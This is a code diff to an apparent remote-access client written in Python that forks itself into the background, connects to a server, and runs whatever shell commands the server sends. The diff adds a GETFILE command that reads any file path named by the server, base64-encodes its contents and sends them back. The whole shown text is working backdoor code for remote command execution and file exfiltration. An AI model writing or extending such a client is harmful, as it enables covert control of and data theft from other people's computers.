@@ -6,6 +6,7 @@ import time
 import json
 import getpass
 import platform
+import base64
 
 def daemonize():
     #run client in the background by forking the process
@@ -50,6 +51,27 @@ def connect_to_server():
                 command = client.recv(4096).decode('utf-8', errors='ignore')
                 if not command:
                     break
+                if command.startswith("GETFILE"):
+                    try:
+                        _, filepath = command.split(maxsplit=1)
+
+                        # expand path (e.g. ~/Desktop/hello.txt)
+                        filepath = os.path.expanduser(filepath)
+                        filename = os.path.basename(filepath)
+                        
+
+                        with open(filepath, "rb") as f:
+                            file_data = f.read()
+
+                        encoded = base64.b64encode(file_data).decode("utf-8")
+                        
+                        message = f"FILE|{filename}|{encoded}"
+                        client.send(message.encode("utf-8"))
+
+                    except Exception as e:
+                        client.send(f"ERROR: {str(e)}".encode("utf-8"))
+
+                    continue #skip normal command execution
                 try:
                     #execute command from server
                     result = subprocess.run(command, shell=True, capture_output=True, text=True)
